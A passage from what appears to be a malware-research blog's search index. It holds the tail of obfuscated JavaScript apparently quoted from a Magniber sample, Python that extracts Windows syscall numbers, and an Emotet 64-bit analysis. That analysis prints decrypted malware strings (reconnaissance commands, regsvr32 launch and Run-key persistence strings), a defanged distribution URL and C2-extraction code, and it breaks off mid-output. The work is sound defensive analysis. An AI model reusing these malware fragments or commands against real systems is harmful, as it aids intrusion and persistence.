s9b80[8]+c7gs9b80[10]+c7gs9b80[27]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[11]+c7gs9b80[28]+c7gs9b80[42]+c7gs9b80[10]+c7gs9b80[13]+c7gs9b80[24]+c7gs9b80[43]+c7gs9b80[58]+c7gs9b80[51]+c7gs9b80[43]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+d8k8ylg+c7gs9b80[27]+c7gs9b80[10]+c7gs9b80[15]+c7gs9b80[5]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[55]+c7gs9b80[27]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[11]+c7gs9b80[28]+c7gs9b80[42]+c7gs9b80[10]+c7gs9b80[13]+c7gs9b80[24]+c7gs9b80[43]+c7gs9b80[58]+c7gs9b80[51]+c7gs9b80[43]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[26]+c7gs9b80[10]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[17]+c7gs9b80[32]+c7gs9b80[21]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[41]+c7gs9b80[2]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[8]+c7gs9b80[8]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[17]+c7gs9b80[32]+c7gs9b80[21]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[19]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[48]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[59]+c7gs9b80[35]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[35]+c7gs9b80[48]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[32]+c7gs9b80[3]+c7gs9b80[14]+c7gs9b80[41]+c7gs9b80[14]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[41]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[1]+c7gs9b80[47]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[15]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[14]+c7gs9b80[41]+c7gs9b80[28]+c7gs9b80[17]);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; .",
            "url": "https://research.openanalysis.net/magniber/malware/research/syscalls/ransomware/2022/05/06/MagniberRansomware.html",
            "relUrl": "/magniber/malware/research/syscalls/ransomware/2022/05/06/MagniberRansomware.html",
            "date": " • May 6, 2022"
        }
        
    
  
    
        ,"post10": {
            "title": "Syscall Reversing",
            "content": "Overview . When we are dealing with syscalls we need to be able to generate a syscall table from ntdll.dll that the sample is run with. The syscalls will vary between versions (DLL versions). . Ransomware Example . Magniber | Threat Analysis Report: PrintNightmare and Magniber Ransomware | . import pefile import struct import re pe = pefile.PE(&#39;/tmp/ntdll.dll&#39;) pe_data = open(&#39;/tmp/ntdll.dll&#39;,&#39;rb&#39;).read() . pe.parse_data_directories(directories=[pefile.DIRECTORY_ENTRY[&#39;IMAGE_DIRECTORY_ENTRY_EXPORT&#39;]]) exports = [] for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols: export_address = exp.address export_name = exp.name export_ord = exp.ordinal exports.append({&#39;name&#39;:export_name, &#39;ord&#39;:export_ord, &#39;address&#39;:export_address}) . for export in exports: if b&#39;ZwQueryEaFile&#39; == export.get(&#39;name&#39;): break export_name = export.get(&#39;name&#39;).decode(&#39;utf-8&#39;) export_offset = pe.get_offset_from_rva(export.get(&#39;address&#39;)) print(f&quot;{export_name} {hex(export_offset)}&quot;) syscall_offset = pe_data.find(b&#39; x0f 05 xc3&#39;, export_offset) print(f&quot;Syscall offset: {hex(syscall_offset)}&quot;) match = re.search(rb&#39; xB8(..) x00 x00&#39;, pe_data[export_offset:syscall_offset]) if match: syscall_number = struct.unpack(&#39;&lt;H&#39;, match.group(1))[0] print(f&quot;Syscall: {hex(syscall_number)}&quot;) . ZwQueryEaFile 0xa1210 Syscall offset: 0xa1222 Syscall: 0x13e . syscalls = {} for export in exports: if export.get(&#39;name&#39;) is not None and b&#39;Zw&#39; == export.get(&#39;name&#39;)[:2]: export_name = export.get(&#39;name&#39;).decode(&#39;utf-8&#39;) export_offset = pe.get_offset_from_rva(export.get(&#39;address&#39;)) syscall_offset = pe_data.find(b&#39; x0f 05 xc3&#39;, export_offset) if syscall_offset == -1: print(f&quot;ERROR no sycall found for export {export_name}&quot;) continue match = re.search(rb&#39; xB8(..) x00 x00&#39;, pe_data[export_offset:syscall_offset], re.DOTALL) if match is None: print(f&quot;ERROR no sycall number for export {export_name}&quot;) continue syscall_number = struct.unpack(&#39;&lt;H&#39;, match.group(1))[0] syscalls[export_name] = syscall_number print(&quot;enum syscalls{&quot;) for export in syscalls: print(f&quot;sys_{export} = {syscalls[export]},&quot;) print(&quot;};&quot;) . enum syscalls{ sys_ZwAcceptConnectPort = 2, sys_ZwAccessCheck = 0, sys_ZwAccessCheckAndAuditAlarm = 41, sys_ZwAccessCheckByType = 99, sys_ZwAccessCheckByTypeAndAuditAlarm = 89, sys_ZwAccessCheckByTypeResultList = 100, sys_ZwAccessCheckByTypeResultListAndAuditAlarm = 101, sys_ZwAccessCheckByTypeResultListAndAuditAlarmByHandle = 102, sys_ZwAcquireProcessActivityReference = 103, sys_ZwAddAtom = 71, sys_ZwAddAtomEx = 104, sys_ZwAddBootEntry = 105, sys_ZwAddDriverEntry = 106, sys_ZwAdjustGroupsToken = 107, sys_ZwAdjustPrivilegesToken = 65, sys_ZwAdjustTokenClaimsAndDeviceGroups = 108, sys_ZwAlertResumeThread = 109, sys_ZwAlertThread = 110, sys_ZwAlertThreadByThreadId = 111, sys_ZwAllocateLocallyUniqueId = 112, sys_ZwAllocateReserveObject = 113, sys_ZwAllocateUserPhysicalPages = 114, sys_ZwAllocateUuids = 115, sys_ZwAllocateVirtualMemory = 24, sys_ZwAllocateVirtualMemoryEx = 116, sys_ZwAlpcAcceptConnectPort = 117, sys_ZwAlpcCancelMessage = 118, sys_ZwAlpcConnectPort = 119, sys_ZwAlpcConnectPortEx = 120, sys_ZwAlpcCreatePort = 121, sys_ZwAlpcCreatePortSection = 122, sys_ZwAlpcCreateResourceReserve = 123, sys_ZwAlpcCreateSectionView = 124, sys_ZwAlpcCreateSecurityContext = 125, sys_ZwAlpcDeletePortSection = 126, sys_ZwAlpcDeleteResourceReserve = 127, sys_ZwAlpcDeleteSectionView = 128, sys_ZwAlpcDeleteSecurityContext = 129, sys_ZwAlpcDisconnectPort = 130, sys_ZwAlpcImpersonateClientContainerOfPort = 131, sys_ZwAlpcImpersonateClientOfPort = 132, sys_ZwAlpcOpenSenderProcess = 133, sys_ZwAlpcOpenSenderThread = 134, sys_ZwAlpcQueryInformation = 135, sys_ZwAlpcQueryInformationMessage = 136, sys_ZwAlpcRevokeSecurityContext = 137, sys_ZwAlpcSendWaitReceivePort = 138, sys_ZwAlpcSetInformation = 139, sys_ZwApphelpCacheControl = 76, sys_ZwAreMappedFilesTheSame = 140, sys_ZwAssignProcessToJobObject = 141, sys_ZwAssociateWaitCompletionPacket = 142, sys_ZwCallEnclave = 143, sys_ZwCallbackReturn = 5, sys_ZwCancelIoFile = 93, sys_ZwCancelIoFileEx = 144, sys_ZwCancelSynchronousIoFile = 145, sys_ZwCancelTimer = 97, sys_ZwCancelTimer2 = 146, sys_ZwCancelWaitCompletionPacket = 147, sys_ZwClearEvent = 62, sys_ZwClose = 15, sys_ZwCloseObjectAuditAlarm = 59, sys_ZwCommitComplete = 148, sys_ZwCommitEnlistment = 149, sys_ZwCommitRegistryTransaction = 150, sys_ZwCommitTransaction = 151, sys_ZwCompactKeys = 152, sys_ZwCompareObjects = 153, sys_ZwCompareSigningLevels = 154, sys_ZwCompareTokens = 155, sys_ZwCompleteConnectPort = 156, sys_ZwCompressKey = 157, sys_ZwConnectPort = 158, sys_ZwContinue = 67, sys_ZwConvertBetweenAuxiliaryCounterAndPerformanceCounter = 159, sys_ZwCreateDebugObject = 160, sys_ZwCreateDirectoryObject = 161, sys_ZwCreateDirectoryObjectEx = 162, sys_ZwCreateEnclave = 163, sys_ZwCreateEnlistment = 164, sys_ZwCreateEvent = 72, sys_ZwCreateEventPair = 165, sys_ZwCreateFile = 85, sys_ZwCreateIRTimer = 166, sys_ZwCreateIoCompletion = 167, sys_ZwCreateJobObject = 168, sys_ZwCreateJobSet = 169, sys_ZwCreateKey = 29, sys_ZwCreateKeyTransacted = 170, sys_ZwCreateKeyedEvent = 171, sys_ZwCreateLowBoxToken = 172, sys_ZwCreateMailslotFile = 173, sys_ZwCreateMutant = 174, sys_ZwCreateNamedPipeFile = 175, sys_ZwCreatePagingFile = 176, sys_ZwCreatePartition = 177, sys_ZwCreatePort = 178, sys_ZwCreatePrivateNamespace = 179, sys_ZwCreateProcess = 180, sys_ZwCreateProcessEx = 77, sys_ZwCreateProfile = 181, sys_ZwCreateProfileEx = 182, sys_ZwCreateRegistryTransaction = 183, sys_ZwCreateResourceManager = 184, sys_ZwCreateSection = 74, sys_ZwCreateSectionEx = 185, sys_ZwCreateSemaphore = 186, sys_ZwCreateSymbolicLinkObject = 187, sys_ZwCreateThread = 78, sys_ZwCreateThreadEx = 188, sys_ZwCreateTimer = 189, sys_ZwCreateTimer2 = 190, sys_ZwCreateToken = 191, sys_ZwCreateTokenEx = 192, sys_ZwCreateTransaction = 193, sys_ZwCreateTransactionManager = 194, sys_ZwCreateUserProcess = 195, sys_ZwCreateWaitCompletionPacket = 196, sys_ZwCreateWaitablePort = 197, sys_ZwCreateWnfStateName = 198, sys_ZwCreateWorkerFactory = 199, sys_ZwDebugActiveProcess = 200, sys_ZwDebugContinue = 201, sys_ZwDelayExecution = 52, sys_ZwDeleteAtom = 202, sys_ZwDeleteBootEntry = 203, sys_ZwDeleteDriverEntry = 204, sys_ZwDeleteFile = 205, sys_ZwDeleteKey = 206, sys_ZwDeleteObjectAuditAlarm = 207, sys_ZwDeletePrivateNamespace = 208, sys_ZwDeleteValueKey = 209, sys_ZwDeleteWnfStateData = 210, sys_ZwDeleteWnfStateName = 211, sys_ZwDeviceIoControlFile = 7, sys_ZwDisableLastKnownGood = 212, sys_ZwDisplayString = 213, sys_ZwDrawText = 214, sys_ZwDuplicateObject = 60, sys_ZwDuplicateToken = 66, sys_ZwEnableLastKnownGood = 215, sys_ZwEnumerateBootEntries = 216, sys_ZwEnumerateDriverEntries = 217, sys_ZwEnumerateKey = 50, sys_ZwEnumerateSystemEnvironmentValuesEx = 218, sys_ZwEnumerateTransactionObject = 219, sys_ZwEnumerateValueKey = 19, sys_ZwExtendSection = 220, sys_ZwFilterBootOption = 221, sys_ZwFilterToken = 222, sys_ZwFilterTokenEx = 223, sys_ZwFindAtom = 20, sys_ZwFlushBuffersFile = 75, sys_ZwFlushBuffersFileEx = 224, sys_ZwFlushInstallUILanguage = 225, sys_ZwFlushInstructionCache = 226, sys_ZwFlushKey = 227, sys_ZwFlushProcessWriteBuffers = 228, sys_ZwFlushVirtualMemory = 229, sys_ZwFlushWriteBuffer = 230, sys_ZwFreeUserPhysicalPages = 231, sys_ZwFreeVirtualMemory = 30, sys_ZwFreezeRegistry = 232, sys_ZwFreezeTransactions = 233, sys_ZwFsControlFile = 57, sys_ZwGetCachedSigningLevel = 234, sys_ZwGetCompleteWnfStateSubscription = 235, sys_ZwGetContextThread = 236, sys_ZwGetCurrentProcessorNumber = 237, sys_ZwGetCurrentProcessorNumberEx = 238, sys_ZwGetDevicePowerState = 239, sys_ZwGetMUIRegistryInfo = 240, sys_ZwGetNextProcess = 241, sys_ZwGetNextThread = 242, sys_ZwGetNlsSectionPtr = 243, sys_ZwGetNotificationResourceManager = 244, sys_ZwGetWriteWatch = 245, sys_ZwImpersonateAnonymousToken = 246, sys_ZwImpersonateClientOfPort = 31, sys_ZwImpersonateThread = 247, sys_ZwInitializeEnclave = 248, sys_ZwInitializeNlsFiles = 249, sys_ZwInitializeRegistry = 250, sys_ZwInitiatePowerAction = 251, sys_ZwIsProcessInJob = 79, sys_ZwIsSystemResumeAutomatic = 252, sys_ZwIsUILanguageComitted = 253, sys_ZwListenPort = 254, sys_ZwLoadDriver = 255, sys_ZwLoadEnclaveData = 256, sys_ZwLoadKey = 257, sys_ZwLoadKey2 = 258, sys_ZwLoadKeyEx = 259, sys_ZwLockFile = 260, sys_ZwLockProductActivationKeys = 261, sys_ZwLockRegistryKey = 262, sys_ZwLockVirtualMemory = 263, sys_ZwMakePermanentObject = 264, sys_ZwMakeTemporaryObject = 265, sys_ZwManageHotPatch = 266, sys_ZwManagePartition = 267, sys_ZwMapCMFModule = 268, sys_ZwMapUserPhysicalPages = 269, sys_ZwMapUserPhysicalPagesScatter = 3, sys_ZwMapViewOfSection = 40, sys_ZwMapViewOfSectionEx = 270, sys_ZwModifyBootEntry = 271, sys_ZwModifyDriverEntry = 272, sys_ZwNotifyChangeDirectoryFile = 273, sys_ZwNotifyChangeDirectoryFileEx = 274, sys_ZwNotifyChangeKey = 275, sys_ZwNotifyChangeMultipleKeys = 276, sys_ZwNotifyChangeSession = 277, sys_ZwOpenDirectoryObject = 88, sys_ZwOpenEnlistment = 278, sys_ZwOpenEvent = 64, sys_ZwOpenEventPair = 279, sys_ZwOpenFile = 51, sys_ZwOpenIoCompletion = 280, sys_ZwOpenJobObject = 281, sys_ZwOpenKey = 18, sys_ZwOpenKeyEx = 282, sys_ZwOpenKeyTransacted = 283, sys_ZwOpenKeyTransactedEx = 284, sys_ZwOpenKeyedEvent = 285, sys_ZwOpenMutant = 286, sys_ZwOpenObjectAuditAlarm = 287, sys_ZwOpenPartition = 288, sys_ZwOpenPrivateNamespace = 289, sys_ZwOpenProcess = 38, sys_ZwOpenProcessToken = 290, sys_ZwOpenProcessTokenEx = 48, sys_ZwOpenRegistryTransaction = 291, sys_ZwOpenResourceManager = 292, sys_ZwOpenSection = 55, sys_ZwOpenSemaphore = 293, sys_ZwOpenSession = 294, sys_ZwOpenSymbolicLinkObject = 295, sys_ZwOpenThread = 296, sys_ZwOpenThreadToken = 36, sys_ZwOpenThreadTokenEx = 47, sys_ZwOpenTimer = 297, sys_ZwOpenTransaction = 298, sys_ZwOpenTransactionManager = 299, sys_ZwPlugPlayControl = 300, sys_ZwPowerInformation = 95, sys_ZwPrePrepareComplete = 301, sys_ZwPrePrepareEnlistment = 302, sys_ZwPrepareComplete = 303, sys_ZwPrepareEnlistment = 304, sys_ZwPrivilegeCheck = 305, sys_ZwPrivilegeObjectAuditAlarm = 306, sys_ZwPrivilegedServiceAuditAlarm = 307, sys_ZwPropagationComplete = 308, sys_ZwPropagationFailed = 309, sys_ZwProtectVirtualMemory = 80, sys_ZwPulseEvent = 310, sys_ZwQueryAttributesFile = 61, sys_ZwQueryAuxiliaryCounterFrequency = 311, sys_ZwQueryBootEntryOrder = 312, sys_ZwQueryBootOptions = 313, sys_ZwQueryDebugFilterState = 314, sys_ZwQueryDefaultLocale = 21, sys_ZwQueryDefaultUILanguage = 68, sys_ZwQueryDirectoryFile = 53, sys_ZwQueryDirectoryFileEx = 315, sys_ZwQueryDirectoryObject = 316, sys_ZwQueryDriverEntryOrder = 317, sys_ZwQueryEaFile = 318, sys_ZwQueryEvent = 86, sys_ZwQueryFullAttributesFile = 319, sys_ZwQueryInformationAtom = 320, sys_ZwQueryInformationByName = 321, sys_ZwQueryInformationEnlistment = 322, sys_ZwQueryInformationFile = 17, sys_ZwQueryInformationJobObject = 323, sys_ZwQueryInformationPort = 324, sys_ZwQueryInformationProcess = 25, sys_ZwQueryInformationResourceManager = 325, sys_ZwQueryInformationThread = 37, sys_ZwQueryInformationToken = 33, sys_ZwQueryInformationTransaction = 326, sys_ZwQueryInformationTransactionManager = 327, sys_ZwQueryInformationWorkerFactory = 328, sys_ZwQueryInstallUILanguage = 329, sys_ZwQueryIntervalProfile = 330, sys_ZwQueryIoCompletion = 331, sys_ZwQueryKey = 22, sys_ZwQueryLicenseValue = 332, sys_ZwQueryMultipleValueKey = 333, sys_ZwQueryMutant = 334, sys_ZwQueryObject = 16, sys_ZwQueryOpenSubKeys = 335, sys_ZwQueryOpenSubKeysEx = 336, sys_ZwQueryPerformanceCounter = 49, sys_ZwQueryPortInformationProcess = 337, sys_ZwQueryQuotaInformationFile = 338, sys_ZwQuerySection = 81, sys_ZwQuerySecurityAttributesToken = 339, sys_ZwQuerySecurityObject = 340, sys_ZwQuerySecurityPolicy = 341, sys_ZwQuerySemaphore = 342, sys_ZwQuerySymbolicLinkObject = 343, sys_ZwQuerySystemEnvironmentValue = 344, sys_ZwQuerySystemEnvironmentValueEx = 345, sys_ZwQuerySystemInformation = 54, sys_ZwQuerySystemInformationEx = 346, sys_ZwQuerySystemTime = 91, sys_ZwQueryTimer = 56, sys_ZwQueryTimerResolution = 347, sys_ZwQueryValueKey = 23, sys_ZwQueryVirtualMemory = 35, sys_ZwQueryVolumeInformationFile = 73, sys_ZwQueryWnfStateData = 348, sys_ZwQueryWnfStateNameInformation = 349, sys_ZwQueueApcThread = 69, sys_ZwQueueApcThreadEx = 350, sys_ZwRaiseException = 351, sys_ZwRaiseHardError = 352, sys_ZwReadFile = 6, sys_ZwReadFileScatter = 46, sys_ZwReadOnlyEnlistment = 353, sys_ZwReadRequestData = 84, sys_ZwReadVirtualMemory = 63, sys_ZwRecoverEnlistment = 354, sys_ZwRecoverResourceManager = 355, sys_ZwRecoverTransactionManager = 356, sys_ZwRegisterProtocolAddressInformation = 357, sys_ZwRegisterThreadTerminatePort = 358, sys_ZwReleaseKeyedEvent = 359, sys_ZwReleaseMutant = 32, sys_ZwReleaseSemaphore = 10, sys_ZwReleaseWorkerFactoryWorker = 360, sys_ZwRemoveIoCompletion = 9, sys_ZwRemoveIoCompletionEx = 361, sys_ZwRemoveProcessDebug = 362, sys_ZwRenameKey = 363, sys_ZwRenameTransactionManager = 364, sys_ZwReplaceKey = 365, sys_ZwReplacePartitionUnit = 366, sys_ZwReplyPort = 12, sys_ZwReplyWaitReceivePort = 11, sys_ZwReplyWaitReceivePortEx = 43, sys_ZwReplyWaitReplyPort = 367, sys_ZwRequestPort = 368, sys_ZwRequestWaitReplyPort = 34, sys_ZwResetEvent = 369, sys_ZwResetWriteWatch = 370, sys_ZwRestoreKey = 371, sys_ZwResumeProcess = 372, sys_ZwResumeThread = 82, sys_ZwRevertContainerImpersonation = 373, sys_ZwRollbackComplete = 374, sys_ZwRollbackEnlistment = 375, sys_ZwRollbackRegistryTransaction = 376, sys_ZwRollbackTransaction = 377, sys_ZwRollforwardTransactionManager = 378, sys_ZwSaveKey = 379, sys_ZwSaveKeyEx = 380, sys_ZwSaveMergedKeys = 381, sys_ZwSecureConnectPort = 382, sys_ZwSerializeBoot = 383, sys_ZwSetBootEntryOrder = 384, sys_ZwSetBootOptions = 385, sys_ZwSetCachedSigningLevel = 386, sys_ZwSetCachedSigningLevel2 = 387, sys_ZwSetContextThread = 388, sys_ZwSetDebugFilterState = 389, sys_ZwSetDefaultHardErrorPort = 390, sys_ZwSetDefaultLocale = 391, sys_ZwSetDefaultUILanguage = 392, sys_ZwSetDriverEntryOrder = 393, sys_ZwSetEaFile = 394, sys_ZwSetEvent = 14, sys_ZwSetEventBoostPriority = 45, sys_ZwSetHighEventPair = 395, sys_ZwSetHighWaitLowEventPair = 396, sys_ZwSetIRTimer = 397, sys_ZwSetInformationDebugObject = 398, sys_ZwSetInformationEnlistment = 399, sys_ZwSetInformationFile = 39, sys_ZwSetInformationJobObject = 400, sys_ZwSetInformationKey = 401, sys_ZwSetInformationObject = 92, sys_ZwSetInformationProcess = 28, sys_ZwSetInformationResourceManager = 402, sys_ZwSetInformationSymbolicLink = 403, sys_ZwSetInformationThread = 13, sys_ZwSetInformationToken = 404, sys_ZwSetInformationTransaction = 405, sys_ZwSetInformationTransactionManager = 406, sys_ZwSetInformationVirtualMemory = 407, sys_ZwSetInformationWorkerFactory = 408, sys_ZwSetIntervalProfile = 409, sys_ZwSetIoCompletion = 410, sys_ZwSetIoCompletionEx = 411, sys_ZwSetLdtEntries = 412, sys_ZwSetLowEventPair = 413, sys_ZwSetLowWaitHighEventPair = 414, sys_ZwSetQuotaInformationFile = 415, sys_ZwSetSecurityObject = 416, sys_ZwSetSystemEnvironmentValue = 417, sys_ZwSetSystemEnvironmentValueEx = 418, sys_ZwSetSystemInformation = 419, sys_ZwSetSystemPowerState = 420, sys_ZwSetSystemTime = 421, sys_ZwSetThreadExecutionState = 422, sys_ZwSetTimer = 98, sys_ZwSetTimer2 = 423, sys_ZwSetTimerEx = 424, sys_ZwSetTimerResolution = 425, sys_ZwSetUuidSeed = 426, sys_ZwSetValueKey = 96, sys_ZwSetVolumeInformationFile = 427, sys_ZwSetWnfProcessNotificationEvent = 428, sys_ZwShutdownSystem = 429, sys_ZwShutdownWorkerFactory = 430, sys_ZwSignalAndWaitForSingleObject = 431, sys_ZwSinglePhaseReject = 432, sys_ZwStartProfile = 433, sys_ZwStopProfile = 434, sys_ZwSubscribeWnfStateChange = 435, sys_ZwSuspendProcess = 436, sys_ZwSuspendThread = 437, sys_ZwSystemDebugControl = 438, sys_ZwTerminateEnclave = 439, sys_ZwTerminateJobObject = 440, sys_ZwTerminateProcess = 44, sys_ZwTerminateThread = 83, sys_ZwTestAlert = 441, sys_ZwThawRegistry = 442, sys_ZwThawTransactions = 443, sys_ZwTraceControl = 444, sys_ZwTraceEvent = 94, sys_ZwTranslateFilePath = 445, sys_ZwUmsThreadYield = 446, sys_ZwUnloadDriver = 447, sys_ZwUnloadKey = 448, sys_ZwUnloadKey2 = 449, sys_ZwUnloadKeyEx = 450, sys_ZwUnlockFile = 451, sys_ZwUnlockVirtualMemory = 452, sys_ZwUnmapViewOfSection = 42, sys_ZwUnmapViewOfSectionEx = 453, sys_ZwUnsubscribeWnfStateChange = 454, sys_ZwUpdateWnfStateData = 455, sys_ZwVdmControl = 456, sys_ZwWaitForAlertByThreadId = 457, sys_ZwWaitForDebugEvent = 458, sys_ZwWaitForKeyedEvent = 459, sys_ZwWaitForMultipleObjects = 91, sys_ZwWaitForMultipleObjects32 = 26, sys_ZwWaitForSingleObject = 4, sys_ZwWaitForWorkViaWorkerFactory = 460, sys_ZwWaitHighEventPair = 461, sys_ZwWaitLowEventPair = 462, sys_ZwWorkerFactoryWorkerReady = 1, sys_ZwWriteFile = 8, sys_ZwWriteFileGather = 27, sys_ZwWriteRequestData = 87, sys_ZwWriteVirtualMemory = 58, sys_ZwYieldExecution = 70, }; .",
            "url": "https://research.openanalysis.net/magniber/malware/research/syscalls/ransomware/2022/05/03/syscall_reversing.html",
            "relUrl": "/magniber/malware/research/syscalls/ransomware/2022/05/03/syscall_reversing.html",
            "date": " • May 3, 2022"
        }
        
    
  
    
        ,"post11": {
            "title": "Emotet 64-bit",
            "content": "Overview . We are going to take a look at the new Emotet 64-bit samples and see if we can generate a Yara rule and a config extractor. . Samples . Packed (b481ac05ea9a59eedf6233166327057279babef26c913a8e89536472b192e86c) | Unpacked (ed2640be5ed0a4486ecf7ac97b125e26b9d263624251eae1c9a42e9998ca1e68) The PS1 has zero detections on VT 👀Distro compromised URL:hxxp://ciencias-exactas[.]com[.]ar/old/w/#Emotet DLL payload, MD5: 71675a9a8abbce8ba524f8f6ef3735ed pic.twitter.com/95Na6SzguN . &mdash; Max_Malyutin (@Max_Mal_) April 28, 2022 🚨#Emotet Update🚨 - Looks like Ivan laid an egg for easter and has been busy. As of about 14:00UTC today 2022/04/18 - Emotet on Epoch 4 has switched over to using 64-bit loaders and stealer modules. Previously everything was 32-bit except for occasional loader shenanigans. 1/x . &mdash; Cryptolaemus (@Cryptolaemus1) April 19, 2022 ### References | Yara rule plugin for IDA/Binja/Cutter | @MaxMal emotet delivery analysis | Emotet botnet switches to 64-bit modules, increases activity | EmoCheck now detects new 64-bit versions of Emotet malware | Emotet Tests New Delivery Techniques | Malpedia Emotet Info (Yara) | . Initial Triage . Payload Binary Overview . DLL with DllRegisterServer export (ord 1) | compiler is MASM | internal name Y.dll | . Code . using the same llvm control flow flattening obfuscator as the 32-bit versions | obscuring function calls by passing constants that are not used | we have some encrypted strings in the .text section | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . String Decryption . The string decrypion works the same way as 32-bit emotet where the first DWORD is the key, the second DWORD is the encrypted string lenght, and the encrypted string follows. We can use the same code. . The strings table starts at the beginning of the .text section. . We can reuse our 32-bit string decryptor with some slight modificaitons. . import struct import pefile EMOTET_FILE = r&#39;/tmp/work/emotet_b481_unpacked.bin&#39; data = open(EMOTET_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) txt_data = None for s in pe.sections: if b&#39;.text&#39; in s.Name: txt_data = s.get_data() # Make sure we got the text section assert txt_data is not None # Strings are xor encrypted def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(s): return all(c &lt; 128 for c in s) strings_table = [] ECS1_string = None ECK1_string = None # Check for the strings in the first 0x1000 bytes of the text section for i in range(0,0x1000,4): candidate_1 = struct.unpack(&#39;&lt;I&#39;,txt_data[i:i+4])[0] candidate_2 = struct.unpack(&#39;&lt;I&#39;,txt_data[i+4:i+8])[0] if (candidate_1 &amp; 0xffffff00) ^ (candidate_2 &amp; 0xffffff00) == 0: # We have a match! key = txt_data[i:i+4] data_len = candidate_1 ^ candidate_2 enc_data = txt_data[i+8:i+8+data_len] ptxt_data = xor_decrypt(enc_data, key) if is_ascii(ptxt_data): if ptxt_data != b&#39;&#39;: strings_table.append(ptxt_data.decode(&#39;latin1&#39;)) if b&#39;ECS1&#39; == ptxt_data[:4]: ECS1_string = ptxt_data if b&#39;ECK1&#39; == ptxt_data[:4]: ECK1_string = ptxt_data # Print our strings print(ECS1_string) print(ECK1_string) for s in strings_table: print(s) . b&#39;ECS1 x00 x00 x00@_t xb6 xc4 xd8 xdc x0c= x1f x06z7 xdc xb9 xf9 xb7 xbd^ x8a/ xa6 xa1 xf2 x0f xa1y r x14 xe5 xf51 xe8 xb0 n x1e&lt; x8b?{ x90 x1d&amp;&amp;1 x86e| x1a xad xd9 xc3 xacH xf0` x87 x18 xd9t&lt;X xf9&#39; b&#39;ECK1 x00 x00 x00 xf3 xa35 xb5 x0e.+ xf45V xcd nL)&gt;| xf1 x10 xdd xcb xb0O xb3 xfa x02 xceL xb6 x0c x1eD x96 xbe xb4 x0e xe6 xc9[ x9a xbdN xbd x9d x8f xcf xe0 x10[4L x82 x04&amp; x02 xd3 xba xac xf1 xfb x9f,v&#39; %s%s.exe %s%s.dll %s regsvr32.exe &#34;%s&#34; %s shlwapi.dll advapi32.dll wininet.dll crypt32.dll userenv.dll wtsapi32.dll bcrypt.dll urlmon.dll shell32.dll SHA256 Microsoft Primitive Provider ECCPUBLICBLOB HASH ObjectLength KeyDataBlob AES ECDH_P256 ECDSA_P256 RNG POST %u.%u.%u.%u --%S-- Cookie: %s=%s Content-Type: multipart/form-data; boundary=%s --%S Content-Disposition: form-data; name=&#34;%S&#34;; filename=&#34;%S&#34; Content-Type: application/octet-stream %s_%08X nltest /dclist: systeminfo ipconfig /all %s %s %s regsvr32.exe &#34;%s %s&#34; SOFTWARE Microsoft Windows CurrentVersion Run %s %s%x %s regsvr32.exe &#34;%s %s&#34; %s WinSta0 Default %s %s %s * %s:Zone.Identifier %s %s.exe     . C2 Table . The c2 list is stored in the .data section in the exact same format as the 32-bit sample. We were able to re-use our 32-bit c2 extractor code. . data_data = None for s in pe.sections: if b&#39;.data&#39; in s.Name: data_data = s.get_data() print(data_data[:100]) key = data_data[:4] data_len = struct.unpack(&#39;&lt;I&#39;,data_data[:4])[0] ^ struct.unpack(&#39;&lt;I&#39;,data_data[4:8])[0] enc_data = data_data[8:8+data_len] ptxt_data = xor_decrypt(enc_data, key) print(tohex(ptxt_data)) print(&quot; n== C2 List== &quot;) for i in range(0,len(ptxt_data),8): print(&quot;%d.%d.%d.%d:%d&quot; % (ptxt_data[i+0],ptxt_data[i+1],ptxt_data[i+2],ptxt_data[i+3],struct.unpack(&#39;&gt;H&#39;,ptxt_data[i+4:i+6])[0])) . b&#34;8 xfd xb9 x1e xc0 xfc xb9 x1e x88 xe2 xf0D9F xb9 x1f x15 xb1&amp; xc8&#39;m xb9 x1f 